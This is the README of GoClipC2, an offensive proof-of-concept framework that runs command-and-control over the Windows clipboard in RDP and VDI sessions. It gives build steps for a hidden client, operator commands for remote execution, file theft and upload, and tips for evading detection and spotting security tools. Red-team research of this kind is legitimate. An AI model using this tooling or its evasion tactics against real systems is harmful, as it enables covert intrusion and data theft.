# GoClipC2
GoClipC2 is a PoC command and control framework that uses the Windows clipboard mechanism for communication in environments where traditional network-based C2 channels may be restricted or monitored. 

The tool is specifically designed to operate effectively in virtualized desktop infrastructure (VDI), Remote Desktop Protocol (RDP) sessions, and standard Windows environments.

![image](https://github.com/user-attachments/assets/e7ff0988-c969-4c7c-9345-3deff7964b31)


_It's very much hacked together so stuff may just not work, it comes with absolutely zero warranty_

## Quick Start
```
git clone https://github.com/ZephrFish/GoClipC2
cd GoClipC2
go mod init clipboard-c2
go mod tidy
```

## Building The Client and Server
The following commands can be executed to build the client in exe format for execution on Windows:
```
# Build the server
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o server.exe server.go

# Build the client
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o client.exe client.go

# Build GUI-less client
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o client-stealth.exe client.go
```

## Features
Currently the implementation supports the following core functions:

- VDI/RDP Environment Detection
- File Upload/Download with Progress
- Command Queuing System
- Background Persistence Control
- Sleep/Wake Management
- Process List Enumeration
- Heartbeat Customisation

The code does include commands for the following functions too but they're not implemented properly:

- Screenshot Capture (not implemented)
- Keylogger Control (not implemented)

## Commands

Basic Operations:
```
list - List connected clients with detailed status
send <client> <cmd>- Send single command to client
queue <client> <cmd1;cmd2> - Queue multiple commands (semicolon separated)
```

File Operations:
```
download <client> <remote> [local] - Download file from client
upload <client> <local> [remote]   - Upload file to client
```

VDI/RDP Research Commands:
```
envinfo <client>   - Get detailed environment information
proclist <client>  - Get running process list
```

Client Management:
```
persist <client> <on|off>  - Enable/disable persistence
sleep <client> <duration>  - Put client to sleep (30s, 5m, 1h)
wake <client>  - Wake up sleeping client
heartbeat <client|ALL> <interval> - Change heartbeat interval
```

Server Options:
```
quiet- Toggle quiet mode (output only)
exit - Shutdown server and exit
```

Examples:
```
send CLIENT1 whoami
queue CLIENT1 whoami ; hostname ; ipconfig /all
download CLIENT1 C:\\temp\\passwords.txt
upload CLIENT1 tool.exe C:\\windows\\temp\\tool.exe
envinfo CLIENT1
screenshot CLIENT1
sleep CLIENT1 30m
heartbeat CLIENT1 10s
```


## What Each Command Does

### Core Commands

#### `list`
Shows all connected clients with their current status including:
- Environment type (RDP/VDI/Physical)
- Active/sleeping status with remaining sleep time
- Connection uptime
- Heartbeat interval
- Number of queued commands
- Persistence status

#### `send`
Executes a single command immediately on the target client:
- Automatically detects shell type (cmd/PowerShell/pwsh)
- Returns formatted output with execution time and timestamp
- Shows both command output and any errors
- Blocks until command completes

#### `queue`
Adds multiple commands to the client's execution queue:
- Commands separated by semicolons are executed sequentially
- Each command result is numbered (Queue[1], Queue[2], etc.)
- 500ms delay between commands
- Queue survives sleep/wake cycles
- Commands wait if client is sleeping

### File Operations

#### `download`
Transfers files from client to server:
- Automatically chunks large files into 800-byte pieces
- Base64 encodes binary data for clipboard compatibility
- Shows real-time progress (percentage and chunks)
- Supports environment variable expansion (`%TEMP%`, `%USERPROFILE%`)
- Saves with "downloaded_" prefix if no local name specified

#### `upload`
Transfers files from server to client:
- Chunks files for reliable clipboard transfer
- Creates target directories automatically if needed
- 200ms delays between chunks for stability
- Progress tracking on both server and client
- Supports binary files through Base64 encoding

### Information Gathering

#### `envinfo`
Performs comprehensive environment fingerprinting:
- Detects session type (RDP, VDI platforms, Physical)
- Identifies virtualization software (VMware, Citrix, VirtualBox)
- Captures environment variables and system information
- Tests clipboard redirection capabilities
- Enumerates VDI/RDP-specific running processes
- Returns detailed JSON with all findings

#### `proclist`
Enumerates running processes for security assessment:
- Uses `tasklist /fo table /v` for detailed information
- Falls back to CSV format if table format fails
- Hidden execution (no visible command windows)
- Shows process names, PIDs, memory usage, user context
- Timestamps results for correlation
- Useful for detecting security tools and monitoring software

### Client Management

#### `persist`
Controls client background operation:
- `on`: Hides console window, enables stealth background mode
- `off`: Shows console window, visible operation mode
- Affects whether client runs visibly or hidden
- Critical for long-term covert operations

#### `sleep`
Puts client into dormant state:
- Stops clipboard monitoring and command processing
- Suspends heartbeat transmissions
- Preserves command queue (commands wait until wake)
- Auto-wakes after specified duration
- Duration format: `30s`, `5m`, `2h`, etc.
- Reduces detection risk during sensitive periods

#### `wake`
Immediately awakens sleeping clients:
- Overrides sleep timer
- Resumes clipboard monitoring
- Restarts heartbeat
- Processes any queued commands
- Returns to normal operational state

#### `heartbeat`
Adjusts communication frequency:
- Controls how often client checks clipboard for commands
- Range: 1 second to 300 seconds (5 minutes)
- `ALL` keyword changes interval for all clients
- Faster = more responsive but higher detection risk
- Slower = stealthier but delayed command execution
- Balances operational needs vs. detection avoidance

### Server Management

#### `quiet`
Toggles server output verbosity:
- **Verbose mode** (default): Full logs, detailed formatting, timestamps
- **Quiet mode**: Command outputs only, minimal formatting
- Useful for automation scripts or reducing log noise
- Doesn't affect functionality, only display format

#### `exit`
Graceful server shutdown:
- Stops clipboard monitoring
- Closes active file transfers
- Terminates server process cleanly
- Clients will lose connection and may enter error states

### Operational Notes

#### Stealth Considerations
- Use longer heartbeat intervals (30s+) in sensitive environments
- Enable persistence mode for background operations
- Leverage sleep/wake cycles to avoid detection during monitoring periods

#### File Transfer Tips
- Large files are automatically chunked - no size limits
- Binary files fully supported through Base64 encoding
- Use environment variables in paths (`%TEMP%`, `%APPDATA%`)

#### Environment Research
- Always run `envinfo` first to understand the target environment
- Use `proclist` to identify security tools before proceeding
- VDI/RDP detection helps tailor attack strategies

#### Command Execution
- Queue commands for batch operations
- PowerShell commands detected automatically (start with "powershell")
- All commands run hidden to avoid detection


### Further Reading
I wrote a blog post([can be found here](https://blog.zsec.uk/clippy-goes-rogue/) to accompany this tooling but have also released [ChunkyIngress](https://github.com/ZephrFish/ChunkyIngress) previously which might also interest you!
